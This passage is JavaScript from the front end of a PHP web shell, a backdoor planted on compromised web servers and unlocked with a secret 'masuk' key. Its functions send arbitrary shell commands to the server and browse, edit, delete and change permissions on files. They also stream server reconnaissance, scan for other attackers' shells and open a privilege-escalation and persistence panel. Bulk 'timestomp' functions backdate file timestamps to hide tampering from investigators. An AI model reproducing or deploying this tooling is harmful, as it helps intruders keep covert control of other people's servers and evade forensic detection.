    const panel = document.getElementById('scanOptionsPanel');
    if (panel.style.display === 'none') {
        panel.style.display = 'block';
        loadCurrentDirectory();  // Load breadcrumb when opened
    } else {
        panel.style.display = 'none';
    }
}

function loadCurrentDirectory() {
    // Get current directory from server
    fetch('?masuk=<?php echo AL_SHELL_KEY ?>&action=get_current_dir')
        .then(r => r.json())
        .then(data => {
            if (data.current_dir) {
                displayBreadcrumb(data.current_dir);
                document.getElementById('scanDir').value = data.current_dir;
            }
        })
        .catch(e => console.log('Could not load directory:', e.message));
}

function displayBreadcrumb(fullPath) {
    // Parse path into segments
    const segments = fullPath.split(/[\\/]+/).filter(s => s);

    // Build clickable breadcrumb
    let html = '';
    let currentPath = '';

    segments.forEach((segment, idx) => {
        if (segment === segments[0] && fullPath.includes(':')) {
            // Windows drive letter
            currentPath = segment + '\\';
        } else {
            currentPath += segment + (idx < segments.length - 1 ? '\\' : '');
        }

        html += `<span style="color:#0f0;cursor:pointer;" onclick="copyToClipboardValue('${currentPath}')" title="Click to copy: ${currentPath}">${segment}</span>`;
        if (idx < segments.length - 1) {
            html += '<span style="color:#666;margin:0 2px;">/</span>';
        }
    });

    document.getElementById('breadcrumbPath').innerHTML = html;

    // Add click-to-copy on the whole breadcrumb area
    document.getElementById('breadcrumbNav').onclick = () => {
        copyToClipboardValue(fullPath);
    };
}

function copyToClipboardValue(value) {
    navigator.clipboard.writeText(value).then(() => {
        // Show feedback
        const original = event.target.textContent;
        event.target.textContent = '✓ Copied!';
        setTimeout(() => {
            event.target.textContent = original;
        }, 1500);
    }).catch(() => {
        // Fallback
        const input = document.createElement('input');
        input.value = value;
        document.body.appendChild(input);
        input.select();
        document.execCommand('copy');
        document.body.removeChild(input);
    });
}

function runScanShells() {
    openModal('privescPersistModal');
    setTimeout(() => {
        // Read scan options from form
        const options = {
            scan_dir: document.getElementById('scanDir').value || null,
            max_depth: parseInt(document.getElementById('scanDepth').value) || 5,
            max_files: parseInt(document.getElementById('scanMaxFiles').value) || 5000,
            min_size: parseInt(document.getElementById('scanMinSize').value) || 0,
            max_size: parseInt(document.getElementById('scanMaxSize').value) || 500000
        };
        scanOtherShells(options);
    }, 100);
}

function htmlEscape(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}
function copyToClipboard(elementId) {
    const element = document.getElementById(elementId);
    const textToCopy = element.value || element.innerText;
    navigator.clipboard.writeText(textToCopy).then(() => {
        alert('✅ Berhasil dicopy ke clipboard!');
    }).catch(err => {
        // Fallback for older browsers
        element.select();
        document.execCommand('copy');
        alert('✅ Berhasil dicopy ke clipboard!');
    });
}

// Check if root

function formatBytes(bytes) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}
function setShellCommand(cmd) {
    document.getElementById('shellCmdInput').value = cmd;
}
function execShellDirect(cmd) {
    document.getElementById('shellCmdInput').value = cmd;
    document.getElementById('shellForm').dispatchEvent(new Event('submit'));
}
function loadAndShowServerInfo() {
    const contentDiv = document.getElementById('serverInfoContent');
    openModal('serverInfoModal');

    contentDiv.innerHTML = `
        <div class="server-info-wrapper">
            <!-- Search & Filter Section -->
            <div class="server-info-section search-section">
                <label class="section-label">🔍 Search & Filter</label>
                <div class="search-row">
                    <input type="text" id="serverInfoSearch" placeholder="Search server info..."
                        style="flex: 1; background: #000; color: #0f0; border: 1px solid #0f0; padding: 10px 12px; border-radius: 6px; font-size: 13px; font-family: monospace;">
                    <button onclick="filterServerInfo()" class="btn-filter">🔎 Filter</button>
                    <button onclick="clearServerInfoFilter()" class="btn-secondary">Clear</button>
                </div>
            </div>

            <!-- Progress Section -->
            <div id="progress-container" class="server-info-section progress-section" style="display: none;">
                <label class="section-label">⏳ Loading Progress</label>
                <div style="display: flex; gap: 12px; margin-bottom: 10px; align-items: center;">
                    <div style="flex: 1; background: #000; height: 24px; border: 1px solid #0f0; border-radius: 4px; overflow: hidden;">
                        <div id="progress-bar" style="height: 100%; background: linear-gradient(90deg, #0f0 0%, #0a0 100%); width: 0%; transition: width 0.3s; display: flex; align-items: center; justify-content: center;">
                            <span id="progress-text" style="color: #000; font-size: 11px; font-weight: bold; text-shadow: 0 0 2px #fff;">0%</span>
                        </div>
                    </div>
                </div>
                <div id="progress-info" style="font-size: 12px; color: #0f0; margin-bottom: 0;">
                    ⏳ <span id="current-section" style="font-weight: bold; font-family: monospace;">Initializing...</span>
                </div>
            </div>

            <!-- Controls Section (2 columns) -->
            <div class="server-info-section controls-section">
                <label class="section-label">⚙️ Tools & Export</label>
                <div class="controls-grid">
                    <div class="control-group">
                        <div class="group-label">Data</div>
                        <div class="button-group">
                            <button onclick="copyAllSections()" class="btn-primary">📋 Copy All</button>
                            <button onclick="filterFavorites()" class="btn-secondary">⭐ Favorites</button>
                        </div>
                    </div>
                    <div class="control-group">
                        <div class="group-label">Export</div>
                        <div class="button-group">
                            <button onclick="exportServerInfo('json')" class="btn-secondary">📊 JSON</button>
                            <button onclick="exportServerInfo('csv')" class="btn-secondary">📈 CSV</button>
                            <button onclick="exportServerInfo('txt')" class="btn-secondary">📄 TXT</button>
                            <button onclick="exportServerInfo('html')" class="btn-secondary">🌐 HTML</button>
                        </div>
                    </div>
                    <div class="control-group">
                        <div class="group-label">Auto Refresh</div>
                        <select id="autoRefreshInterval" class="select-refresh">
                            <option value="0">Disabled</option>
                            <option value="30">30 seconds</option>
                            <option value="60">1 minute</option>
                            <option value="300">5 minutes</option>
                            <option value="900">15 minutes</option>
                        </select>
                    </div>
                </div>
            </div>

            <!-- Content Section -->
            <div class="server-info-section content-section">
                <div id="sections-container"></div>
                <div id="errors-container"></div>
            </div>
        </div>
    `;

    // Show progress container
    setTimeout(() => {
        const progressContainer = document.getElementById('progress-container');
        if (progressContainer) progressContainer.style.display = 'block';
    }, 100);

    const progressBar = document.getElementById('progress-bar');
    const progressText = document.getElementById('progress-text');
    const progressInfo = document.getElementById('progress-info');
    const sectionsContainer = document.getElementById('sections-container');
    const errorsContainer = document.getElementById('errors-container');

    const url = '?masuk=<?php echo AL_SHELL_KEY ?>&action=get_server_info_stream&use_cache=1';
    const eventSource = new EventSource(url);
    let timedOutSections = [];
    let cachedSections = [];

    eventSource.onmessage = function(event) {
        try {
            const data = JSON.parse(event.data);

            if (data.complete) {
                eventSource.close();
                let statusMsg = '✅ Server information loaded successfully!';
                if (cachedSections.length > 0) {
                    statusMsg += ` (${cachedSections.length} sections from cache)`;
                }
                progressInfo.innerHTML = '<span style="color: #6cf;">' + statusMsg + '</span>';

                if (timedOutSections.length > 0) {
                    let timeoutWarning = '<div style="background: #2a1a0a; border: 1px solid #ff0; padding: 10px; margin-top: 15px; border-radius: 3px;">';
                    timeoutWarning += '<div style="color: #ff0; font-weight: bold; margin-bottom: 5px;">⚠️ Timeout Warnings:</div>';
                    timeoutWarning += '<div style="font-size: 11px; color: #0f0;">' + timedOutSections.join('<br>') + '</div>';
                    timeoutWarning += '</div>';
                    errorsContainer.innerHTML = timeoutWarning;
                }
                return;
            }

            if (data.section) {
                const progress = data.progress || 0;
                progressBar.style.width = progress + '%';
                progressText.textContent = progress + '%';

                const currentText = data.index + '/' + data.total + ' - ' + data.section;
                document.getElementById('current-section').textContent = currentText;

                if (data.timeout) {
                    timedOutSections.push('⏱️ ' + data.section + ' (command exceeded limit)');
                }
                if (data.cached) {
                    cachedSections.push(data.section);
                }

                const cacheTag = data.cached ? '<span style="color: #ff0; font-size: 9px; float: right; margin-right: 5px;">💾 CACHED</span>' : '';
                const statusTag = data.timeout ? '<span style="color: #6cf; font-size: 10px; float: right;">⏱️ TIMEOUT</span>' : '<span style="color: #0f0; font-size: 10px; float: right;">✓</span>';

                const sectionHtml = `
                    <div data-section-name="${data.section}" style="background: #000; border-left: 3px solid #0f0; padding: 10px 12px; margin-bottom: 8px; border-radius: 2px; display: block;">
                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 6px;">
                            <span style="color: #0f0; font-weight: bold; font-size: 11px; text-transform: uppercase; letter-spacing: 0.5px;">${data.section}</span>
                            <span style="font-size: 9px; color: #999;">${cacheTag} ${statusTag}</span>
                        </div>
                        <pre style="background: #0a0a0a; color: #0f0; padding: 8px; margin: 0; overflow-x: auto; font-size: 11px; border-radius: 2px; max-height: 120px; overflow-y: auto; white-space: pre-wrap; word-wrap: break-word; line-height: 1.3; border: 1px solid #0a2a0a;">${data.content}</pre>
                        <div style="display: flex; gap: 6px; margin-top: 6px; flex-wrap: wrap;">
                            <button onclick="copySection(this)" style="font-size: 9px; padding: 4px 8px; background: #0a2a0a; color: #0f0; border: 1px solid #0f0; cursor: pointer; border-radius: 2px; transition: all 0.2s;">📋 Copy</button>
                            <button data-favorite-btn="${data.section}" onclick="toggleFavorite('${data.section.replace(/'/g, "\\'")}')" style="font-size: 9px; padding: 4px 8px; background: #0a2a0a; color: #6cf; border: 1px solid #6cf; cursor: pointer; border-radius: 2px; transition: all 0.2s;">☆ Fav</button>
                        </div>
                    </div>
                `;

                sectionsContainer.insertAdjacentHTML('beforeend', sectionHtml);
            }
        } catch (e) {
            console.error('Error parsing SSE data:', e);
        }
    };

    eventSource.onerror = function(error) {
        eventSource.close();

        errorsContainer.innerHTML = '<div style="background: #2a0a0a; border: 1px solid #f44; padding: 10px; margin-top: 10px; border-radius: 3px; color: #f44;"><strong>❌ Connection Error</strong><br>Failed to load server information. Please try again.</div>';
        progressInfo.innerHTML = '❌ <span style="color: #f44;">Failed to load server information</span>';
    };

    // Setup auto-refresh
    const refreshSelect = document.getElementById('autoRefreshInterval');
    if (refreshSelect) {
        refreshSelect.addEventListener('change', function() {
            if (window.serverInfoRefreshInterval) {
                clearInterval(window.serverInfoRefreshInterval);
            }
            const interval = parseInt(this.value) * 1000;
            if (interval > 0) {
                window.serverInfoRefreshInterval = setInterval(() => {
                    if (document.getElementById('serverInfoModal').style.display !== 'none') {
                        loadAndShowServerInfo();
                    }
                }, interval);
            }
        });
    }

    // Initialize favorites display
    setTimeout(() => {
        updateFavoriteButtons();
    }, 500);
}

function filterServerInfo() {
    const searchTerm = document.getElementById('serverInfoSearch').value.toLowerCase();
    if (!searchTerm) return;

    const sections = document.querySelectorAll('[data-section-name]');
    let matchCount = 0;

    sections.forEach(section => {
        const text = section.textContent.toLowerCase();
        if (text.includes(searchTerm)) {
            section.style.display = 'block';
            section.style.borderLeftColor = '#0f0';
            section.style.backgroundColor = '#0a2a0a';
            matchCount++;
        } else {
            section.style.display = 'none';
        }
    });

    const searchBox = document.getElementById('serverInfoSearch');
    searchBox.style.borderColor = matchCount > 0 ? '#0f0' : '#f44';
}

function clearServerInfoFilter() {
    document.getElementById('serverInfoSearch').value = '';
    document.getElementById('serverInfoSearch').style.borderColor = '#0f0';
    const sections = document.querySelectorAll('[data-section-name]');
    sections.forEach(section => {
        section.style.display = 'block';
        section.style.borderLeftColor = '#0f0';
        section.style.backgroundColor = '#000';
    });
}

function exportServerInfo(format) {
    const url = '?masuk=<?php echo AL_SHELL_KEY ?>&action=export_server_info&format=' + format;
    window.open(url, '_blank');
}

function copySection(button) {
    const section = button.closest('[data-section-name]');
    const pre = section.querySelector('pre');
    const text = pre.textContent;
    navigator.clipboard.writeText(text).then(() => {
        const originalText = button.textContent;
        button.textContent = '✅ Copied!';
        setTimeout(() => {
            button.textContent = originalText;
        }, 2000);
    }).catch(err => {
        button.textContent = '❌ Copy failed';
        console.error('Copy failed:', err);
    });
}

function copyAllSections() {
    const sections = document.querySelectorAll('[data-section-name]');
    let allText = '════════════════════════════════════════════════════════════\n';
    allText += 'SERVER INFORMATION - ALL SECTIONS\n';
    allText += 'Generated: ' + new Date().toLocaleString() + '\n';
    allText += '════════════════════════════════════════════════════════════\n\n';

    sections.forEach(section => {
        const sectionName = section.getAttribute('data-section-name');
        const pre = section.querySelector('pre');
        if (pre) {
            allText += '────────────────────────────────────────────────────────────\n';
            allText += sectionName + '\n';
            allText += '────────────────────────────────────────────────────────────\n';
            allText += pre.textContent + '\n\n';
        }
    });

    navigator.clipboard.writeText(allText).then(() => {
        const btn = document.querySelector('[onclick="copyAllSections()"]');
        if (btn) {
            const originalText = btn.textContent;
            btn.textContent = '✅ All Copied!';
            setTimeout(() => {
                btn.textContent = originalText;
            }, 2000);
        }
    }).catch(err => {
        console.error('Copy failed:', err);
        alert('❌ Failed to copy all sections');
    });
}

function toggleFavorite(sectionName) {
    let favorites = JSON.parse(localStorage.getItem('serverInfoFavorites') || '[]');
    const index = favorites.indexOf(sectionName);

    if (index > -1) {
        favorites.splice(index, 1);
    } else {
        favorites.push(sectionName);
    }

    localStorage.setItem('serverInfoFavorites', JSON.stringify(favorites));
    updateFavoriteButtons();
}

function updateFavoriteButtons() {
    const favorites = JSON.parse(localStorage.getItem('serverInfoFavorites') || '[]');
    document.querySelectorAll('[data-favorite-btn]').forEach(btn => {
        const sectionName = btn.getAttribute('data-favorite-btn');
        if (favorites.includes(sectionName)) {
            btn.textContent = '⭐ Favorited';
            btn.style.color = '#ff0';
            btn.style.borderColor = '#ff0';
        } else {
            btn.textContent = '☆ Favorite';
            btn.style.color = '#6cf';
            btn.style.borderColor = '#6cf';
        }
    });
}

function filterFavorites() {
    const favorites = JSON.parse(localStorage.getItem('serverInfoFavorites') || '[]');
    const sections = document.querySelectorAll('[data-section-name]');

    sections.forEach(section => {
        const sectionName = section.getAttribute('data-section-name');
        if (favorites.includes(sectionName)) {
            section.style.display = 'block';
        } else {
            section.style.display = 'none';
        }
    });
}
function viewFileAsync(fileName) {
    const modal = document.getElementById('viewModal');
    const title = document.getElementById('viewTitle');
    const content = document.getElementById('viewContent');
    const editBtn = document.getElementById('viewEditBtn');
    
    // Store current file name for edit mode switch
    modal.dataset.currentFile = fileName;
    
    title.textContent = 'View: ' + fileName;
    content.textContent = '⏳ Loading...';
    
    // Reset button state
    editBtn.disabled = false;
    editBtn.classList.remove('no-edit');
    editBtn.textContent = 'Edit';
    
    openModal('viewModal');
    fetch('?masuk=<?php echo AL_SHELL_KEY ?>&d=<?php echo urlencode($dir) ?>&action=view_file&file=' + encodeURIComponent(fileName))
        .then(response => response.json())
        .then(data => { 
            content.textContent = data.content;
            // Handle writable status
            if (!data.writable) {
                editBtn.disabled = true;
                editBtn.classList.add('no-edit');
                editBtn.textContent = 'No Edit Permission';
            }
        })
        .catch(error => { content.textContent = 'Error loading file: ' + error; });
}
function switchToEditMode() {
    const modal = document.getElementById('viewModal');
    const fileName = modal.dataset.currentFile;
    closeModal('viewModal');
    openEditModal(fileName);
}
function openEditModal(fileName) {
    const modal = document.getElementById('editModal');
    const saveBtn = document.getElementById('editSaveBtn');
    const contentArea = document.getElementById('editContent');
    
    document.getElementById('editTitle').textContent = 'Edit: ' + fileName;
    document.getElementById('editFile').value = fileName;
    contentArea.value = '⏳ Loading...';
    
    // Reset button state
    saveBtn.disabled = false;
    saveBtn.classList.remove('no-edit');
    saveBtn.textContent = 'Save';
    
    openModal('editModal');
    fetch('?masuk=<?php echo AL_SHELL_KEY ?>&d=<?php echo urlencode($dir) ?>&action=view_file&file=' + encodeURIComponent(fileName))
        .then(response => response.json())
        .then(data => { 
            document.getElementById('editContent').value = data.content;
            // Handle writable status
            if (!data.writable) {
                saveBtn.disabled = true;
                saveBtn.classList.add('no-edit');
                saveBtn.textContent = 'No Edit Permission';
                contentArea.readOnly = true;
            } else {
                contentArea.readOnly = false;
            }
        });
}
function openRenameModal(fileName) {
    document.getElementById('renameTitle').textContent = 'Rename: ' + fileName;
    document.getElementById('renameTarget').value = fileName;
    document.querySelector('#renameModal input[name="new_name"]').value = fileName;
    openModal('renameModal');
}
function openChmodModal(fileName) {
    document.getElementById('chmodTitle').textContent = 'Change Permissions: ' + fileName;
    document.getElementById('chmodTarget').value = fileName;
    document.getElementById('customPermInput').value = '';
    document.getElementById('customPermDiv').style.display = 'none';
    document.getElementById('chmodPermSelect').value = '755';
    openModal('chmodModal');
}
function openDeleteModal(fileName) {
    document.getElementById('deleteMessage').textContent = `Are you sure you want to delete "${fileName}"?`;
    document.getElementById('deleteTarget').value = fileName;
    openModal('confirmDeleteModal');
}
function toggleCreateContent() {
    const createType = document.getElementById('createType').value;
    const createOptions = document.getElementById('createOptions');
    const createContent = document.getElementById('createContent');
    const createMode = document.querySelector('input[name="create_mode"]:checked');
    
    if (createType === 'dir') {
        createOptions.style.display = 'none';
        createContent.style.display = 'none';
    } else {
        createOptions.style.display = 'flex';
        if (createMode && createMode.value === 'content') {
            createContent.style.display = 'block';
        } else {
            createContent.style.display = 'none';
        }
    }
}
function goToDefaultDirectory() {
    window.location.href = '?masuk=<?php echo AL_SHELL_KEY ?>&d=<?php echo urlencode($default_dir) ?>';
}
document.getElementById('searchForm').addEventListener('submit', function(e) {
    e.preventDefault();
    var contentDiv = document.getElementById('searchResultsContent');
    contentDiv.innerHTML = '<div style="text-align:center;padding:30px;color:var(--info);">Searching, please wait...</div>';
    var formData = new FormData(this);
    formData.append('action', 'perform_search');
    formData.append('masuk', '<?php echo AL_SHELL_KEY ?>');
    formData.append('d', <?php echo json_encode($dir) ?>);
    fetch('?masuk=<?php echo AL_SHELL_KEY ?>&action=perform_search', {
        method: 'POST',
        body: formData
    })
        .then(function(response){ return response.text(); })
        .then(function(html){
            if(!html.trim()) {
                contentDiv.innerHTML = '<div style="text-align:center;padding:30px;color:var(--text-dim);">No results found.</div>';
            } else {
                contentDiv.innerHTML = html;
            }
        })
        .catch(function(error){
            contentDiv.innerHTML = '<div style="text-align:center;padding:30px;color:var(--danger);">Search failed: ' + error.message + '</div>';
        });
});
function shellExecHandler(inputId, outputId) {
    var cmd = document.getElementById(inputId).value.trim();
    if (!cmd) return;
    var output = document.getElementById(outputId);
    output.textContent = '$ ' + cmd + '\nExecuting...';
    var fd = new FormData();
    fd.append('action', 'fm_exec');
    fd.append('cmd', cmd);
    fd.append('cwd', <?php echo json_encode($dir) ?>);
    fd.append('masuk', '<?php echo AL_SHELL_KEY ?>');
    fetch(window.location.href, { method: 'POST', body: fd })
        .then(function(r) { return r.json(); })
        .then(function(data) {
            var result = '$ ' + cmd + '\n';
            if (data.success && data.output) {
                result += data.output;
            } else if (data.error) {
                result += 'Error: ' + data.error;
            } else {
                result += '(no output)';
            }
            if (data.timed_out) result += '\n[Command timed out]';
            output.textContent = result;
        })
        .catch(function(error) {
            output.textContent = '$ ' + cmd + '\nError: ' + error.message;
        });
}
document.getElementById('shellForm').addEventListener('submit', function(e) {
    e.preventDefault();
    shellExecHandler('shellCmdInput', 'shellOutput');
});
document.getElementById('shellFormModal').addEventListener('submit', function(e) {
    e.preventDefault();
    shellExecHandler('shellCmdInputModal', 'shellOutputModal');
});
document.getElementById('chmodForm').addEventListener('submit', function(e) {
    e.preventDefault();
    const formData = new FormData(this);
    const permSelect = document.getElementById('chmodPermSelect');
    const customInput = document.getElementById('customPermInput');
    if (permSelect.value === 'custom') {
        if (customInput.value.trim() === '') {
            alert('Please enter a custom permission value.');
            return;
        }
        formData.set('chmod_perm', customInput.value);
    }
    fetch('', { method: 'POST', body: formData }).then(() => window.location.reload());
});
document.getElementById('chmodPermSelect').addEventListener('change', function() {
    const customDiv = document.getElementById('customPermDiv');
    if (this.value === 'custom') {
        customDiv.style.display = 'block';
    } else {
        customDiv.style.display = 'none';
    }
});
document.getElementById('navigateForm').addEventListener('submit', function(e) {
    e.preventDefault();
    const formData = new FormData(this);
    formData.append('masuk', '<?php echo AL_SHELL_KEY ?>');
    fetch('', { method: 'POST', body: formData })
        .then(response => {
            if (response.redirected) {
                window.location.href = response.url;
            } else {
                return response.text();
            }
        })
        .then(html => {
            if (html) {
                const parser = new DOMParser();
                const doc = parser.parseFromString(html, 'text/html');
                const newOutput = doc.querySelector('.output');
                if (newOutput && newOutput.innerText.trim()) {
                    alert(newOutput.innerText.trim());
                }
            }
        })
        .catch(error => {
            alert('Error navigating to directory: ' + error);
        });
});
document.addEventListener('click', function(e) {
    if (e.target.classList.contains('action-link')) {
        const row = e.target.closest('tr');
        if (row) {
            const fileName = row.dataset.filename;
            if (e.target.textContent.includes('[V]')) viewFileAsync(fileName);
            if (e.target.textContent.includes('[E]')) openEditModal(fileName);
            if (e.target.textContent.includes('[R]')) openRenameModal(fileName);
            if (e.target.textContent.includes('[Chmod]')) openChmodModal(fileName);
            if (e.target.textContent.includes('[Del]')) openDeleteModal(fileName);
            if (e.target.textContent.includes('[U]')) unzipFile(fileName);
        }
    }
});
// Legacy bulk button click handlers (using getElementById)
document.getElementById('zipSelectedBtn').addEventListener('click', function() {
    var checkboxes = document.querySelectorAll('.file-select:checked');
    if (checkboxes.length === 0) return;
    var formData = new FormData();
    formData.append('action', 'zip_selected');
    checkboxes.forEach(function(cb) { formData.append('selected_files[]', cb.value); });
    fetch('', { method: 'POST', body: formData }).then(function() { window.location.reload(); });
});
document.getElementById('deleteSelectedBtn').addEventListener('click', function() {
    var checkboxes = document.querySelectorAll('.file-select:checked');
    if (checkboxes.length === 0) return;
    if (confirm('Are you sure you want to delete ' + checkboxes.length + ' selected item(s)?')) {
        var formData = new FormData();
        formData.append('action', 'delete_selected');
        checkboxes.forEach(function(cb) { formData.append('selected_files[]', cb.value); });
        fetch('', { method: 'POST', body: formData }).then(function() { window.location.reload(); });
    }
});
document.getElementById('chmodSelectedBtn').addEventListener('click', function() {
    var checkboxes = document.querySelectorAll('.file-select:checked');
    if (checkboxes.length === 0) return;
    document.getElementById('chmodBulkCount').textContent = checkboxes.length;
    document.getElementById('chmodBulkProgress').style.display = 'none';
    document.getElementById('chmodBulkResults').style.display = 'none';
    document.getElementById('chmodBulkExecuteBtn').disabled = false;
    document.getElementById('chmodBulkExecuteBtn').textContent = '🚀 Execute';
    document.getElementById('chmodBulkCloseBtn').textContent = 'Cancel';
    openModal('chmodBulkModal');
});
document.getElementById('timestompSelectedBtn').addEventListener('click', function() {
    openTimestompBulkModal();
});

// Chmod Bulk execute function
async function executeChmodBulk() {
    const checkboxes = document.querySelectorAll('.file-select:checked');
    const permission = document.getElementById('chmodBulkPerm').value === 'custom' 
        ? document.getElementById('chmodBulkCustomInput').value 
        : document.getElementById('chmodBulkPerm').value;
    const recursive = document.getElementById('chmodBulkRecursive').checked;
    
    if (!permission) {
        alert('Please enter a permission value');
        return;
    }
    
    // UI updates
    const executeBtn = document.getElementById('chmodBulkExecuteBtn');
    const closeBtn = document.getElementById('chmodBulkCloseBtn');
    const progressDiv = document.getElementById('chmodBulkProgress');
    const resultsDiv = document.getElementById('chmodBulkResults');
    const progressBar = document.getElementById('chmodBulkProgressBar');
    const currentSpan = document.getElementById('chmodBulkCurrent');
    const totalSpan = document.getElementById('chmodBulkTotal');
    const statusDiv = document.getElementById('chmodBulkStatus');
    
    executeBtn.disabled = true;
    executeBtn.textContent = '⏳ Processing...';
    closeBtn.textContent = 'Running...';
    progressDiv.style.display = 'block';
    resultsDiv.style.display = 'block';
    resultsDiv.innerHTML = '<div style="color:#6cf">🚀 Starting chmod bulk operation...</div>';
    
    const files = Array.from(checkboxes).map(cb => cb.value);
    
    try {
        const formData = new FormData();
        formData.append('action', 'chmod_bulk');
        formData.append('chmod_perm', permission);
        formData.append('chmod_recursive', recursive ? '1' : '0');
        files.forEach(f => formData.append('selected_files[]', f));
        
        statusDiv.textContent = 'Sending request...';
        
        const response = await fetch('', { method: 'POST', body: formData });
        const data = await response.json();
        
        if (data.success) {
            totalSpan.textContent = data.total;
            currentSpan.textContent = data.total;
            progressBar.style.width = '100%';
            
            // Sort: success first, then failed
            const sortedItems = data.processed.sort((a, b) => {
                if (a.success === b.success) return 0;
                return a.success ? -1 : 1; // Success first
            });
            
            // Build results
            let html = '';
            html += '<div style="margin-bottom:10px;padding:8px;background:#1a1a1a;border-radius:4px;display:flex;gap:15px;">';
            html += '<span class="text-primary">✅ Success: ' + data.success_count + '</span>';
            html += '<span class="text-danger">❌ Failed: ' + data.failed_count + '</span>';
            html += '<span class="text-muted">Total: ' + data.total + '</span>';
            html += '</div>';
            
            // Show processed items with clickable paths (limited to first 100)
            const displayItems = sortedItems.slice(0, 100);
            displayItems.forEach(item => {
                const icon = item.type === 'dir' ? '📁' : '📄';
                const color = item.success ? '#0f0' : '#f44';
                const status = item.success ? '✓' : '✗';
                const encodedDir = encodeURIComponent(item.dir);
                
                html += '<div class="my-2 text-sm d-flex items-center gap-8">';
                html += '<span class="font-bold min-w-15" style="color:' + color + ';">' + status + '</span>';
                html += '<span class="text-muted">' + icon + '</span>';
                html += '<a href="?masuk=<?php echo AL_SHELL_KEY ?>&d=' + encodedDir + '" ';
                html += 'target="_blank" class="text-cyan no-underline break-all" ';
                html += 'title="Open: ' + escapeHtml(item.dir) + '">';
                html += escapeHtml(item.path);
                html += '</a>';
                html += '</div>';
            });
            
            if (sortedItems.length > 100) {
                html += '<div class="text-muted text-xs mt-10 p-2 bg-main rounded-sm">';
                html += '... and ' + (sortedItems.length - 100) + ' more items (showing first 100)</div>';
            }
            
            // Show errors if any (only failed items summary)
            if (data.failed_count > 0) {
                html += '<div class="mt-10 p-4 bg-dark rounded-sm border">';
                html += '<div class="text-danger font-bold mb-8">❌ Failed Items Summary:</div>';
                const failedItems = sortedItems.filter(item => !item.success).slice(0, 20);
                failedItems.forEach(item => {
                    html += '<div class="text-danger text-xs">• ' + escapeHtml(item.path) + '</div>';
                });
                if (data.failed_count > 20) {
                    html += '<div class="text-muted text-xs mt-4">... and ' + (data.failed_count - 20) + ' more failed</div>';
                }
                html += '</div>';
            }
            
            resultsDiv.innerHTML = html;
            statusDiv.innerHTML = '<span class="text-primary font-bold">✅ Completed!</span>';
            
            executeBtn.textContent = '✅ Done';
            closeBtn.textContent = 'Close';
            
            // Don't auto refresh - let user review results and click paths
        } else {
            throw new Error('Server returned error');
        }
    } catch (error) {
        resultsDiv.innerHTML = '<div class="text-danger">❌ Error: ' + escapeHtml(error.message) + '</div>';
        statusDiv.innerHTML = '<span class="text-danger">❌ Failed</span>';
        executeBtn.disabled = false;
        executeBtn.textContent = '🚀 Retry';
        closeBtn.textContent = 'Close';
    }
}

// Chmod bulk permission select change
document.getElementById('chmodBulkPerm').addEventListener('change', function() {
    const customDiv = document.getElementById('chmodBulkCustomDiv');
    if (this.value === 'custom') {
        customDiv.style.display = 'block';
    } else {
        customDiv.style.display = 'none';
    }
});

// 🔥 TIMESTOMP BULK FUNCTIONS

// Apply preset timestamp
function applyTimestompPreset(preset) {
    const timeInput = document.getElementById('timestompBulkTime');
    if (!preset) return;
    
    const now = new Date();
    let targetDate = new Date();
    
    switch(preset) {
        case '1year':
            targetDate.setFullYear(now.getFullYear() - 1);
            break;
        case '6months':
            targetDate.setMonth(now.getMonth() - 6);
            break;
        case '1month':
            targetDate.setMonth(now.getMonth() - 1);
            break;
        case '1week':
            targetDate.setDate(now.getDate() - 7);
            break;
        case 'yesterday':
            targetDate.setDate(now.getDate() - 1);
            break;
        case 'now':
            targetDate = now;
            break;
        default:
            // Reference file - will be handled server-side
            timeInput.value = '';
            timeInput.placeholder = 'Using: ' + preset;
            timeInput.dataset.reference = preset;
            return;
    }
    
    // Format: DD-MM-YYYY HH:MM:SS
    const day = String(targetDate.getDate()).padStart(2, '0');
    const month = String(targetDate.getMonth() + 1).padStart(2, '0');
    const year = targetDate.getFullYear();
    const hours = String(targetDate.getHours()).padStart(2, '0');
    const minutes = String(targetDate.getMinutes()).padStart(2, '0');
    const seconds = String(targetDate.getSeconds()).padStart(2, '0');
    
    timeInput.value = `${day}-${month}-${year} ${hours}:${minutes}:${seconds}`;
    delete timeInput.dataset.reference;
}

// Open timestomp modal
function openTimestompBulkModal() {
    const checkboxes = document.querySelectorAll('.file-select:checked');
    if (checkboxes.length === 0) {
        alert('Please select at least one file or folder');
        return;
    }
    
    document.getElementById('timestompBulkCount').textContent = checkboxes.length;
    
    // Reset form
    document.getElementById('timestompBulkTime').value = '';
    document.getElementById('timestompBulkPreset').value = '';
    document.getElementById('timestompBulkRecursive').checked = false;
    document.getElementById('timestompBulkProgress').style.display = 'none';
    document.getElementById('timestompBulkResults').style.display = 'none';
    
    // Reset buttons
    const executeBtn = document.getElementById('timestompBulkExecuteBtn');
    const closeBtn = document.getElementById('timestompBulkCloseBtn');
    executeBtn.disabled = false;
    executeBtn.textContent = '⏰ Execute Timestomp';
    closeBtn.textContent = 'Cancel';
    
    openModal('timestompBulkModal');
}

// Execute timestomp bulk
async function executeTimestompBulk() {
    const checkboxes = document.querySelectorAll('.file-select:checked');
    const timeInput = document.getElementById('timestompBulkTime');
    const recursive = document.getElementById('timestompBulkRecursive').checked;
    
    let timestamp = timeInput.value.trim();
    let referenceFile = '';
    
    // Check if using reference file
    if (timeInput.dataset.reference) {
        referenceFile = timeInput.dataset.reference;
        timestamp = '';
    } else if (!timestamp) {
        alert('Please enter a timestamp or select a preset');
        return;
    }
    
    // UI updates
    const executeBtn = document.getElementById('timestompBulkExecuteBtn');
    const closeBtn = document.getElementById('timestompBulkCloseBtn');
    const progressDiv = document.getElementById('timestompBulkProgress');
    const resultsDiv = document.getElementById('timestompBulkResults');
    const progressBar = document.getElementById('timestompBulkProgressBar');
    const currentSpan = document.getElementById('timestompBulkCurrent');
    const totalSpan = document.getElementById('timestompBulkTotal');
    const statusDiv = document.getElementById('timestompBulkStatus');
    
    executeBtn.disabled = true;
    executeBtn.textContent = '⏳ Processing...';
    closeBtn.textContent = 'Running...';
    progressDiv.style.display = 'block';
    resultsDiv.style.display = 'block';
    resultsDiv.innerHTML = '<div class="text-warning">🚀 Starting timestomp operation...</div>';
    
